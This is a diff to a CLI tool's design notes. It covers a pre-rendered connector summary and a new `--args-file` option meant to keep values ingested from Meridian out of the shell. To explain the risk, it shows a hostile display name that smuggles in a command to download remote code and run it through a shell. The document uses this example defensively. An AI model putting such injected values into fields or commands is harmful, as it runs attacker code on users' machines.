@@ -89,7 +89,17 @@ currency-unknown unless paired with `asof`.
     clean; and failing rows do **not** spend the `--max-detail` budget — they sort first, so charging
     them to the same counter left the delivering table with 2 rows instead of 10. That last one
     shipped in the first draft and the test was verified to fail against it.
-  - **`connect --with-connectors` narrows it once more, to `"shape": "preflight"`.** Brief cut the
+  - **`connect --with-connectors` returns the launch summary already rendered
+    (`"shape": "rendered"`).** `coverage_markdown()` applies the narration rules and the model shows
+    `connectors.markdown` as it stands; the block also carries `needsAttention` (and `idle`) so a
+    later answer can say when it lands on a broken source. Until this, the model built the summary
+    from the row shape below by following about 11,400 chars of rules in SKILL.md §1.5, and no test
+    read either half. Measured live: the block went 16,175 → 4,838 chars and §1.5 went 10,614 → 2,588.
+    The rules for reading rows moved, unchanged, to [connectors.md](connectors.md), which the
+    `connectors` verb still needs. Three things the render does that the prose did not: an `idle`
+    connector is not counted as delivering, every connector is named exactly once, and customer text
+    is neutralised in code (`_md_text`) instead of by instruction.
+  - **`--coverage-rows` gives the earlier launch shape, `"shape": "preflight"`.** Brief cut the
     payload but not the row count, and §1.5 renders ~6-8 delivering rows plus a rollup line and ~6-8
     needing attention — so a large stack handed the model every connector's full row to print about
     a third of them, nearly two thirds of the block's chars describing connectors that reach the
@@ -355,6 +365,21 @@ zero as the window receded, which looks like real improvement.
 Numeric values go out as **unquoted JSON numbers** (`Float`/`Integer` are coerced); a quoted number
 returns 0 records silently. `==`, `!=`, `in`, `not in` are **case-sensitive** — prefer `match` when the
 user's phrasing is fuzzy.
+
+### `--args-file`: values from Meridian never pass through a shell
+
+`--args-file PATH` works anywhere on the command line and is replaced by the arguments in PATH, a JSON
+array of strings. It is how a value copied from Meridian output reaches a verb. The customer's
+environment controls those values: anyone who can edit their own display name in a connected source
+controls theirs. Typed into `profile --name "…"`, a name like `Bob $(curl … | sh)` runs before the
+script starts, in bash and in PowerShell, and PowerShell also ends a single-quoted string at a curly
+quote. A file written with the agent's file tool reaches the script untouched.
+
+The format is JSON on purpose. With one argument per line, a newline inside an ingested name would
+become a second argument, which means a flag the attacker chose. A malformed file, a non-string
+element or a nested `--args-file` is refused before anything runs, never parsed in part. A path under
+`~/.meridian` is refused like every other file input, because a token file read as arguments would
+quote the token back in argparse's error.
 
 ### Field metadata is trusted, not guessed
 
